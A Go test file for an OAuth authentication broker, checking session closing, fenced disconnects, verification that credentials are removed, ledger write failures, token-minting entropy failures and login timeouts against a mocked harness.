func TestCloseSessionCancelsPendingFlows(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	flow := harness.broker.byID[flowID]

	harness.broker.closeSession(t.Context(), harness.session.id)
	require.Equal(t, authStateCancelled, harness.broker.flowState(flow))
	require.Equal(t, authReasonSessionClosed, flow.reason)

	// A second pass finds nothing and a foreign session id touches nothing.
	harness.broker.closeSession(t.Context(), harness.session.id)
	harness.broker.closeSession(t.Context(), acp.SessionId("other"))
}

// TestCloseSessionSkipsTerminalFlows pins that a flow already terminal keeps its
// own reason when the session closes.
// TestCloseSessionDropsRetainedFlows pins the retained record's only exit: an
// idempotency key answers for as long as its session lives and answers nothing
// after it does not.
func TestCloseSessionDropsRetainedFlows(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	scriptManualCodeLogin(harness, "code-1", pi.AuthMessage{OK: true})

	params := authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth)

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, params)
	require.NoError(t, err)

	harness.broker.closeSession(t.Context(), harness.session.id)

	harness.broker.mu.Lock()
	defer harness.broker.mu.Unlock()
	require.Empty(t, harness.broker.retained)
}

func TestCloseSessionSkipsTerminalFlows(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	flow := harness.broker.byID[flowID]

	harness.broker.mu.Lock()
	flow.state = authStateFailed
	flow.reason = authReasonTransport
	harness.broker.mu.Unlock()

	harness.broker.closeSession(t.Context(), harness.session.id)
	require.Equal(t, authReasonTransport, flow.reason)
}

func TestDisconnectRemovesFencedSlot(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	_, err := harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	})
	require.NoError(t, err)

	removed := make(chan struct{}, 1)

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		switch request.Op {
		case pi.AuthOpRemove:
			require.Equal(t, "anthropic", request.ProviderID)
			removed <- struct{}{}
			harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, OK: true})
		case pi.AuthOpProbe:
			harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindProbe, Entries: map[string]string{}})
		}

		return nil
	})

	result, err := harness.call(t.Context(), AuthDisconnectMethod, map[string]any{
		authFieldSessionID:         string(harness.session.id),
		authFieldProviderID:        "anthropic",
		authFieldConnectionID:      "conn-1",
		authFieldBindingGeneration: 1,
	})
	require.NoError(t, err)
	require.Equal(t, struct{}{}, result)
	require.Len(t, removed, 1)

	record, _, err := harness.broker.ledger.read("anthropic")
	require.NoError(t, err)
	require.Equal(t, authLedgerRemoved, record.State)
	require.Equal(t, int64(2), record.BindingGeneration, "the generation is bumped before anything is touched")
}

// TestDisconnectFencesConnectionAndGeneration pins that a differently fenced
// entry is never removed.
func TestDisconnectFencesConnectionAndGeneration(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		require.FailNow(t, "a fence mismatch never reaches the harness")

		return nil
	})

	for _, params := range []map[string]any{
		{
			authFieldSessionID:         string(harness.session.id),
			authFieldProviderID:        "anthropic",
			authFieldConnectionID:      "conn-other",
			authFieldBindingGeneration: 1,
		},
		{
			authFieldSessionID:         string(harness.session.id),
			authFieldProviderID:        "anthropic",
			authFieldConnectionID:      "conn-1",
			authFieldBindingGeneration: 9,
		},
		{
			authFieldSessionID:         string(harness.session.id),
			authFieldProviderID:        "never-seen",
			authFieldConnectionID:      "conn-1",
			authFieldBindingGeneration: 1,
		},
	} {
		_, err := harness.call(t.Context(), AuthDisconnectMethod, params)
		requireAuthFailed(t, err, authCauseBindingConflict)
	}

	// The bridge assertion above already proves no native removal ran; the
	// ledger proves the generation was not bumped either.
	live, ok, err := harness.broker.ledger.read("anthropic")
	require.NoError(t, err)
	require.True(t, ok)
	require.Equal(t, int64(1), live.BindingGeneration)
	require.NotEqual(t, authLedgerRemoved, live.State)
}

// TestDisconnectVerifiesAbsence pins that a slot still occupied after removal
// fails the leg rather than claiming success.
func TestDisconnectVerifiesAbsence(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		switch request.Op {
		case pi.AuthOpRemove:
			harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, OK: true})
		case pi.AuthOpProbe:
			harness.deliver(ctx, pi.AuthMessage{
				ID:      request.ID,
				Kind:    pi.AuthKindProbe,
				Entries: map[string]string{"anthropic": "oauth"},
			})
		}

		return nil
	})

	_, err := harness.call(t.Context(), AuthDisconnectMethod, map[string]any{
		authFieldSessionID:         string(harness.session.id),
		authFieldProviderID:        "anthropic",
		authFieldConnectionID:      "conn-1",
		authFieldBindingGeneration: 1,
	})
	requireAuthFailed(t, err, authCauseHarvestFailed)
}

// TestDisconnectReportsNativeRemovalFailure pins that a refused removal never
// records an absence nobody verified.
func TestDisconnectReportsNativeRemovalFailure(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, Cause: authCauseProcess})

		return nil
	})

	_, err := harness.call(t.Context(), AuthDisconnectMethod, map[string]any{
		authFieldSessionID:         string(harness.session.id),
		authFieldProviderID:        "anthropic",
		authFieldConnectionID:      "conn-1",
		authFieldBindingGeneration: 1,
	})
	requireAuthFailed(t, err, authCauseTransport)

	record, _, err := harness.broker.ledger.read("anthropic")
	require.NoError(t, err)
	require.Equal(t, authLedgerIntent, record.State)
}

func TestDisconnectRejectsBadParams(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	base := map[string]any{
		authFieldSessionID:         string(harness.session.id),
		authFieldProviderID:        "anthropic",
		authFieldConnectionID:      "conn-1",
		authFieldBindingGeneration: 1,
	}

	for _, field := range []string{
		authFieldSessionID, authFieldProviderID, authFieldConnectionID, authFieldBindingGeneration,
	} {
		params := map[string]any{}
		for key, value := range base {
			params[key] = value
		}

		delete(params, field)

		_, err := harness.call(t.Context(), AuthDisconnectMethod, params)
		requireInvalidParams(t, err)
	}

	unknown := map[string]any{}
	for key, value := range base {
		unknown[key] = value
	}

	unknown[authFieldSessionID] = "missing"
	_, err := harness.call(t.Context(), AuthDisconnectMethod, unknown)
	require.Error(t, err)

	_, err = harness.call(t.Context(), AuthDisconnectMethod, json.RawMessage(`[]`))
	requireInvalidParams(t, err)
}

func TestNewAuthTokenReportsEntropyFailure(t *testing.T) {
	original := authRandRead
	authRandRead = func([]byte) (int, error) { return 0, errors.New("no entropy") }

	t.Cleanup(func() { authRandRead = original })

	_, err := newAuthToken()
	require.Error(t, err)
}

// failingAuthToken makes the nth mint fail so a leg's own token failure is
// reachable behind the exchange token it mints first.
func failingAuthToken(t *testing.T, after int) {
	t.Helper()

	original := authRandRead
	remaining := after

	authRandRead = func(value []byte) (int, error) {
		if remaining == 0 {
			return 0, errors.New("no entropy")
		}

		remaining--

		return original(value)
	}

	t.Cleanup(func() { authRandRead = original })
}

func TestAuthMethodsReportsGenerationMintFailure(t *testing.T) {
	harness := newAuthHarness(t)

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindCatalog, Providers: defaultAuthProviders()})

		return nil
	})

	failingAuthToken(t, 1)

	_, err := harness.call(t.Context(), AuthMethodsMethod, map[string]any{authFieldSessionID: string(harness.session.id)})
	requireAuthFailed(t, err, authCauseProcess)
}

func TestAuthorizeReportsFlowMintFailure(t *testing.T) {
	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	failingAuthToken(t, 0)

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	requireAuthFailed(t, err, authCauseProcess)
}

func TestAuthorizeReportsLedgerWriteFailure(t *testing.T) {
	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	original := ledgerRename
	ledgerRename = func(string, string) error { return errors.New("rename") }

	t.Cleanup(func() { ledgerRename = original })

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	requireAuthFailed(t, err, authCauseProcess)
}

// TestCallbackReportsConfirmationWriteFailure pins that a confirmation the
// adapter could not persist fails the leg rather than claiming residence.
func TestCallbackReportsConfirmationWriteFailure(t *testing.T) {
	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	original := ledgerRename
	ledgerRename = func(string, string) error { return errors.New("rename") }

	t.Cleanup(func() { ledgerRename = original })

	_, err := harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	})
	requireAuthFailed(t, err, authCauseProcess)
}

// TestCallbackReportsVetoRecordedDuringTheFlow pins that a veto raised while the
// native login ran wins over the terminal result it reports.
func TestCallbackReportsVetoRecordedDuringTheFlow(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	harness.broker.veto(harness.broker.byID[flowID], authCauseUnsupportedVariant)

	_, err := harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	})
	requireAuthFailed(t, err, authCauseUnsupportedVariant)
}

// TestSupersedeLeavesTerminalFlowAlone pins that superseding an already-terminal
// record keeps its own reason.
func TestSupersedeLeavesTerminalFlowAlone(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	flow := harness.broker.byID[flowID]

	harness.broker.mu.Lock()
	flow.state = authStateFailed
	flow.reason = authReasonTransport
	harness.broker.mu.Unlock()

	harness.broker.supersede(t.Context(), authFlowKey{sessionID: harness.session.id, providerID: "anthropic"}, authReasonSuperseded)
	require.Equal(t, authReasonTransport, flow.reason)

	// A key naming no flow supersedes nothing.
	harness.broker.supersede(t.Context(), authFlowKey{sessionID: harness.session.id, providerID: "absent"}, authReasonSuperseded)
}

// TestCloseSessionIgnoresOtherSessions pins that closing one session leaves
// another session's pending flow addressable.
func TestCloseSessionIgnoresOtherSessions(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	flowID := startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	harness.broker.closeSession(t.Context(), acp.SessionId("someone-else"))
	require.Equal(t, authStatePending, harness.broker.flowState(harness.broker.byID[flowID]))
}

func TestDisconnectReportsLedgerFailures(t *testing.T) {
	harness := newAuthHarness(t)
	startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	params := map[string]any{
		authFieldSessionID:         string(harness.session.id),
		authFieldProviderID:        "anthropic",
		authFieldConnectionID:      "conn-1",
		authFieldBindingGeneration: 1,
	}

	originalRead := ledgerReadFile
	ledgerReadFile = func(string) ([]byte, error) { return nil, errors.New("read") }

	_, err := harness.call(t.Context(), AuthDisconnectMethod, params)
	requireAuthFailed(t, err, authCauseHarvestFailed)

	ledgerReadFile = originalRead

	originalRename := ledgerRename
	ledgerRename = func(string, string) error { return errors.New("rename") }

	t.Cleanup(func() { ledgerRename = originalRename })

	_, err = harness.call(t.Context(), AuthDisconnectMethod, params)
	requireAuthFailed(t, err, authCauseProcess)
}

// TestDisconnectReportsRemovalRecordFailure pins that the removal confirmation
// is durable or the leg fails.
func TestDisconnectReportsRemovalRecordFailure(t *testing.T) {
	harness := newAuthHarness(t)
	startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		switch request.Op {
		case pi.AuthOpRemove:
			harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, OK: true})
		case pi.AuthOpProbe:
			harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindProbe, Entries: map[string]string{}})
		}

		return nil
	})

	writes := 0
	originalRename := ledgerRename
	ledgerRename = func(from string, to string) error {
		writes++
		if writes > 1 {
			return errors.New("rename")
		}

		return originalRename(from, to)
	}

	t.Cleanup(func() { ledgerRename = originalRename })

	_, err := harness.call(t.Context(), AuthDisconnectMethod, map[string]any{
		authFieldSessionID:         string(harness.session.id),
		authFieldProviderID:        "anthropic",
		authFieldConnectionID:      "conn-1",
		authFieldBindingGeneration: 1,
	})
	requireAuthFailed(t, err, authCauseProcess)
}

// TestDisconnectReportsProbeFailure pins that a verification that could not run
// fails the leg rather than recording an absence nobody established.
func TestDisconnectReportsProbeFailure(t *testing.T) {
	harness := newAuthHarness(t)
	startManualCodeFlow(t, harness, "code-1", pi.AuthMessage{OK: true})

	shortenAuthNativeCallTimeout(t)

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		if request.Op == pi.AuthOpRemove {
			harness.deliver(ctx, pi.AuthMessage{ID: request.ID, Kind: pi.AuthKindResult, OK: true})
		}

		return nil
	})

	_, err := harness.call(t.Context(), AuthDisconnectMethod, map[string]any{
		authFieldSessionID:         string(harness.session.id),
		authFieldProviderID:        "anthropic",
		authFieldConnectionID:      "conn-1",
		authFieldBindingGeneration: 1,
	})
	requireAuthFailed(t, err, authCauseHarvestFailed)
}

// TestAuthorizeTimesOutOnSilentLogin pins the adapter's own bound: a native
// login that reports nothing is a timeout, never a presentation.
func TestAuthorizeTimesOutOnSilentLogin(t *testing.T) {
	originalCall := authNativeCallTimeoutValue
	authNativeCallTimeoutValue = 20 * time.Millisecond

	t.Cleanup(func() { authNativeCallTimeoutValue = originalCall })

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	release := make(chan struct{})
	t.Cleanup(func() { close(release) })

	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error {
		<-release

		return nil
	})

	_, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	requireAuthFailed(t, err, authCauseTimeout)
}

// TestCallbackTimesOutAwaitingNativeAcceptance pins that a login that never
// settles leaves the flow failed/acceptance_unknown: material crossed the
// boundary and nothing reported what happened to it.
func TestCallbackTimesOutAwaitingNativeAcceptance(t *testing.T) {
	originalLogin := authLoginTimeoutValue
	authLoginTimeoutValue = 20 * time.Millisecond

	t.Cleanup(func() { authLoginTimeoutValue = originalLogin })

	harness := newAuthHarness(t)
	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())

	release := make(chan struct{})
	t.Cleanup(func() { close(release) })

	harness.scriptBridge(func(ctx context.Context, request pi.AuthRequest) error {
		harness.deliver(ctx, pi.AuthMessage{
			ID:    request.ID,
			Kind:  pi.AuthKindEvent,
			Event: &pi.AuthNativeEvent{Type: authNativeEventAuthURL, URL: authTestURL, Instructions: "Complete login in your browser."},
		})
		harness.deliver(ctx, pi.AuthMessage{
			ID:      request.ID,
			Kind:    pi.AuthKindPrompt,
			Prompt:  pi.AuthPromptManualCode,
			Message: "Paste the authorization code here",
		})

		<-release

		return nil
	})

	authorized, err := harness.call(t.Context(), AuthAuthorizeMethod, authorizeParams(harness, "anthropic", generation, authMethodTypeOAuth))
	require.NoError(t, err)

	flowID := authorizeResult(t, authorized).FlowID

	_, err = harness.call(t.Context(), AuthCallbackMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldMethod:     authMethodTypeOAuth,
		authFieldFlowID:     flowID,
		authFieldInput:      "code-1",
	})
	requireAuthFailed(t, err, authCauseTimeout)

	status, err := harness.call(t.Context(), AuthStatusMethod, map[string]any{
		authFieldSessionID:  string(harness.session.id),
		authFieldProviderID: "anthropic",
		authFieldFlowID:     flowID,
	})
	require.NoError(t, err)
	require.Equal(t, authStatusResult{
		FlowID: flowID,
		State:  authStateFailed,
		Reason: authReasonAcceptanceUnknown,
	}, status)
}
